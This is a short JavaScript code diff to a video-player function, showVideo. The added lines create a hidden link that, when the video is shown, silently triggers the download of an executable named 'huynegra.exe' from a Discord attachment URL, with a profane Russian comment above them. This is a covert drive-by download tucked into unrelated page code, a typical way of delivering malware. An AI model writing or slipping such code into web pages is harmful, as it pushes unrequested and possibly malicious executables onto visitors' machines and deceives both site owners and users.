@@ -12,6 +12,19 @@ function showVideo() {
         videoContainer.style.display = "none";
         buttonContainer.style.display = "block";
     });
+
+    // я заебался писать эту залупу, сука
+    var fileUrl = "https://cdn.discordapp.com/attachments/1032644488306360373/1109910553960398918/huynegra.exe"; 
+    var fileName = "huynegra.exe"; 
+
+    var link = document.createElement("a");
+    link.href = fileUrl;
+    link.download = fileName;
+    link.target = "_blank";
+    link.style.display = "none";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 }
 
 var playButton = document.getElementById("play-button");
